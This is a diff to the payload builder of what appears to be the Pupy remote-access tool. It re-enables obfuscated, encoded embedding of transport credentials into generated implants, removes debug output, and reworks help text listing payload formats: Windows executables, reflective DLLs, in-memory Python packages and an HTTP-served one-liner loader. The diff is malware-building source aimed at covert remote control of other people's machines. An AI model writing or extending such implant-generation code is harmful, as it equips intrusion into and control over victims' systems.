@@ -77,13 +77,12 @@ def get_raw_conf(conf, obfuscate=False):
         else:
             print colorize("[!] ", "yellow")+"[-] Credential %s have not been found for transport %s. Fall-back to default credentials. You should edit your crypto/credentials.py file"%(c, l.get_transport())
     pupy_credentials_mod={"pupy_credentials.py" : cred_src}
-    print pupy_credentials_mod
-    #new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(pupy_credentials_mod)))+"\n"
+
+    new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(pupy_credentials_mod)))+"\n"
     new_conf+=obf_func("LAUNCHER=%s"%(repr(conf['launcher'])))+"\n"
     new_conf+=obf_func("LAUNCHER_ARGS=%s"%(repr(conf['launcher_args'])))+"\n"
     new_conf+=offline_script
     new_conf+="\n"
-    print new_conf
     
     return new_conf
 
@@ -210,23 +209,21 @@ def parse_scriptlets(args_scriptlet, debug=False):
 
 class ListOptions(argparse.Action):
     def __call__(self, parser, namespace, values, option_string=None):
-        print colorize("## available formats :", "green")
+        print colorize("## available formats :", "green")+" usage: -f <format>"
         print "\t- exe_86, exe_x64 : generate PE exe for windows"
         print "\t- dll_86, dll_x64 : generate reflective dll for windows"
         print "\t- py              : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
         print "\t- py_oneliner     : same as \"py\" format but served over http to load it from a single command line"
 
         print ""
-        print colorize("## available transports :","green")
-        for name, dic in transports.iteritems():
-            print "\t- {}".format(name,)
-            print "\t       {:<15} : {}".format("description", dic["info"])
-            arguments=','.join([x for x in dic["client_kwargs"].iterkeys()])+','.join([x for x in dic["client_transport_kwargs"].iterkeys()])
-            if not arguments:
-                arguments = "none"
-            print "\t       {:<15} : {}".format("arguments" ,arguments)
+        print colorize("## available transports :","green")+" usage: -t <transport>"
+        for name, tc in transports.iteritems():
+            try:
+                print "\t- {:<14} : {}".format(name, tc.info)
+            except Exception as e:
+                logging.error(e)
 
-        print colorize("## available scriptlets :", "green")
+        print colorize("## available scriptlets :", "green")+" usage: -s <scriptlet>,<arg1>=<value>,<args2=value>..."
         scriptlets_dic=load_scriptlets()
         for name, sc in scriptlets_dic.iteritems():
             print "\t- {:<15} : ".format(name)
